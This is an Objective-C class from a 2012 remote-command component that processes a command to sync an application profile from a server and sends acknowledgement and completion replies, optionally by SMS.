/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SyncApplicationProfileProcessor
 - Version      :  1.0  
 - Purpose      :  Ask the client to request an application profile from the server
 - Copy right   :  13/07/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */

#import "SyncApplicationProfileProcessor.h"
#import "ApplicationProfileManager.h"


@interface SyncApplicationProfileProcessor (private)
- (void) processSyncApplicationProfile;
- (void) syncApplicationProfileException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end


@implementation SyncApplicationProfileProcessor

/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the SyncApplicationProfileProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	
	DLog (@"SyncApplicationProfileProcessor--->initWithRemoteCommandData")
	
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark Overriden method

/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the SyncApplicationProfileProcessor
 - Argument list and description:	No Argument 
 - Return description:	No return type
 - Overided				RemoteCmdAsyncHTTPProcessor
 */
- (void) doProcessingCommand {
	DLog (@"SyncApplicationProfileProcessor ---> doProcessingCommand")
	[self processSyncApplicationProfile];
}


#pragma mark Private method

/**
 - Method name:			processSyncApplicationProfile
 - Purpose:				This method is used to process Sync Application Profile
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processSyncApplicationProfile {
	DLog (@"SyncApplicationProfileProcessor ---> processSyncApplicationProfile")
	
	id <ApplicationProfileManager> appProfileManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mApplicationProfileManager];
	BOOL isReady = [appProfileManager syncAppProfile:self];
	if (!isReady) {
		DLog (@"!!! not ready to process sync application profile command")
		[self syncApplicationProfileException];
	}
	else {
		DLog (@".... processing syn application profile command")
		[self acknowldgeMessage];
	}
}

/**
 - Method name:			syncApplicationProfileException
 - Purpose:				This method is invoked when it fails to get application profile
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) syncApplicationProfileException {
	DLog (@"SyncApplicationProfileProcessor ---> syncApplicationProfileException");
	FxException* exception = [FxException exceptionWithName:@"syncApplicationProfileException" andReason:@"Sync Application Profile error"];
	//[exception setErrorCode:kApplicationProfileManagerBusy];
	[exception setErrorCode:kCmdExceptionErrorCmdBeingRetried];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:			acknowldgeMessage
 - Purpose:				This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:	No Return
 */
- (void) acknowldgeMessage {
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kSyncApplicationProfileSucessMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name:			sendReplySMS:isProcessCompleted:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description:	aStatusCode (NSUInteger)
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"SyncApplicationProfileProcessor ---> sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name:			processFinished
 - Purpose:				This method is invoked when sync application profile process is completed
 - Argument list and description:	No Argument 
 - Return description:	isValidArguments (BOOL)
 */
-(void) processFinished {
	DLog (@"SyncApplicationProfileProcessor ---> processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

// protocol ApplicationProfileDelegate
- (void) syncAppProfileDidFinished: (NSError *) aError {
	DLog (@"!!!!!!! SyncApplicationProfileProcessor ---> syncAppProfileDidFinished")
	if (!aError) {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:_SUCCESS_];
		NSString *syncApplicationProfileMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kSyncApplicationProfileSucessMSG2", @"")];		
		[self sendReplySMS:syncApplicationProfileMessage isProcessCompleted:YES];
	} else {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:[aError code]];
		[self sendReplySMS:messageFormat isProcessCompleted:YES];
	}
}


@end
